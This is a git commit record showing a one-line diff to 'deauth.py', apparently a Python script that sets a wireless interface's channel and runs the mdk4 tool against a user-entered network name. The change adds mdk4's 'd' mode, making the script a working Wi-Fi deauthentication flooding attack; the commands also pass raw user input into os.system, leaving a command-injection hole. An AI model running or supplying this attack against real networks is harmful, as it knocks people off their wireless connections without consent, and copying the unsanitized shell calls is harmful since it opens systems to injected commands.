93d6107a7b61393f98ccc3512f6fcee33d108f05
sudoaptinstalllevi <fcloudservice@gmail.com>
2025-06-24 23:55:23 +1000

    Update deauth.py

--- deauth.py
+++ deauth.py
@@ -6,7 +6,7 @@ ent_ch = input("enter your network channel: ")
 os.system(f"sudo iwconfig {interface} channel {ent_ch}")
 try: 
   ssid = input("enter the ssid/name_of_the_wifi of the router: ")
-  os.system(f"sudo mdk4 {interface} -E {ssid}")
+  os.system(f"sudo mdk4 {interface} d -E {ssid}")
 except KeyboardInterrupt:
   print("exited")
 
